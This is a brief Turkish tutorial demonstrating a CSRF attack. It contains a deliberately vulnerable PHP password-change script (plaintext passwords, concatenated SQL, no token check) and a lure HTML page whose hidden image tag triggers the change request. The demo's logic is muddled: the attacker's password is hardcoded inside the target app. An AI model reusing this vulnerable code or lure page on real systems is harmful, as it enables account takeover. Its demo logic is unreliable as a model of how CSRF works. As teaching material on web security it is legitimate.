CSRF Exploit Örneği
Bu exploit, bir kullanıcının tarayıcısı aracılığıyla habersizce şifre değiştirme isteği göndermesini sağlayan bir saldırıyı simüle eder.

📌 Senaryo:

Kurban, oturum açmış durumda.

Saldırgan, kurbanın bilgilerini değiştirmek için GET isteğiyle çalışan bir sistem buluyor.

Kurban, saldırganın hazırladığı kötü niyetli HTML sayfasını ziyaret ederse, arka planda yetkisiz bir işlem gerçekleşir.

🔴 Savunmasız PHP Kodu (Hedef Uygulama)


```
<?php
session_start();
$conn = new mysqli("localhost", "kullanici", "sifre", "veritabani");

if ($conn->connect_error) {
    die("Bağlantı başarısız: " . $conn->connect_error);
}

// Kullanıcı oturum açmışsa işlemi gerçekleştir
if (isset($_SESSION['user_id'])) {
    $newPassword = "hacked123";  // Yeni şifre saldırgan tarafından belirleniyor
    $userId = $_SESSION['user_id'];

    // Şifreyi değiştirme sorgusu (CSRF'ye açık!)
    $sql = "UPDATE users SET password = '$newPassword' WHERE id = $userId";
    $conn->query($sql);

    echo "Şifreniz başarıyla değiştirildi!";
}

$conn->close();
?>

```

```
<html>
  <body>
    <h1>Ücretsiz Hediyeni Kazan!</h1>
    <img src="http://hedefsite.com/change-password.php" style="display:none;">
  </body>
</html>

```

 Ne Olur?

Kurban, bu sayfayı ziyaret ettiğinde, arka planda bir GET isteği gönderilir.

Kurban oturum açmışsa şifresi değiştirilir ve artık saldırgan yeni şifreyle giriş yapabilir!